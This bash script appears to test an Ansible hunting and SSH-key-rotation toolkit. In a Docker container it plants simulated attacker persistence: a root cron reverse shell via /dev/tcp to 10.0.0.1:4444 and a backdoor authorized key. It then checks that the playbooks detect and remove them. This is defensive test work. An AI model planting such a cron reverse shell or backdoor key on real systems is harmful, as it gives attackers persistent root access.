#!/usr/bin/env bash
# Usage: ./tests/linux/test-ansible.sh   # needs docker, ansible-core, community.docker
set -euo pipefail
cd "$(dirname "$0")/../.."
name=pvj-ansible-test
tmp=$(mktemp -d)
docker rm -f "$name" >/dev/null 2>&1 || true
root=$PWD
trap 'docker rm -f "$name" >/dev/null; rm -rf "$tmp" "$root/findings/ansible-test"; rmdir "$root/findings" 2>/dev/null' EXIT

docker run -d --name "$name" ubuntu:24.04 sleep infinity >/dev/null
docker exec "$name" bash -c 'apt-get update -qq && apt-get install -y -qq python3 sudo openssh-server cron >/dev/null 2>&1 && mkdir -p /run/sshd && /usr/sbin/sshd'
ssh-keygen -q -t ed25519 -N '' -f "$tmp/team"
ssh-keygen -q -t ed25519 -N '' -f "$tmp/red"
docker exec "$name" bash -c "echo '* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /etc/cron.d/red
  install -d -m700 /root/.ssh && echo '$(cat "$tmp/red.pub")' > /root/.ssh/authorized_keys"
printf 'linux:\n  hosts:\n    %s:\n      ansible_connection: community.docker.docker\n' "$name" > "$tmp/inv.yml"

cd ansible
ok=1
check() { if eval "$2"; then echo "PASS $1"; else echo "FAIL $1"; ok=0; fi; }

ansible-playbook -i "$tmp/inv.yml" hunt.yml -e run=ansible-test > "$tmp/hunt.log" || { cat "$tmp/hunt.log"; exit 1; }
f=../findings/ansible-test/$name
check "hunt fetched autostart findings" "grep -qE '^FAIL[[:space:]]cron[[:space:]]/etc/cron.d/red[[:space:]]' $f/get-autostart-findings.tsv"
check "hunt fetched sshd findings" "test -s $f/get-sshd-config-findings.tsv"
check "hunt left nothing on the host" "! docker exec $name test -e /opt/pvj/findings"

ansible-playbook -i "$tmp/inv.yml" ssh-rotate.yml -e team_pub="$tmp/team.pub" > "$tmp/r1.log" || { cat "$tmp/r1.log"; exit 1; }
# ssh-keygen -Q exits 1 when a key IS revoked, so match on its output, not its rc
check "red key revoked via KRL" "[[ \$(docker exec -i $name ssh-keygen -Q -f /etc/ssh/revoked_keys /dev/stdin < $tmp/red.pub || true) == *REVOKED* ]]"
check "root keys reset to team key" "docker exec $name cat /root/.ssh/authorized_keys | grep -qF \"\$(cut -d' ' -f2 $tmp/team.pub)\" && ! docker exec $name grep -qF \"\$(cut -d' ' -f2 $tmp/red.pub)\" /root/.ssh/authorized_keys"

ansible-playbook -i "$tmp/inv.yml" ssh-rotate.yml -e team_pub="$tmp/team.pub" > "$tmp/r2.log" || { cat "$tmp/r2.log"; exit 1; }
check "second ssh-rotate run is changed=0" "grep -qE '$name +: ok=[0-9]+ +changed=0 ' $tmp/r2.log"
[[ $ok -eq 1 ]] || { cat "$tmp/r2.log"; exit 1; }
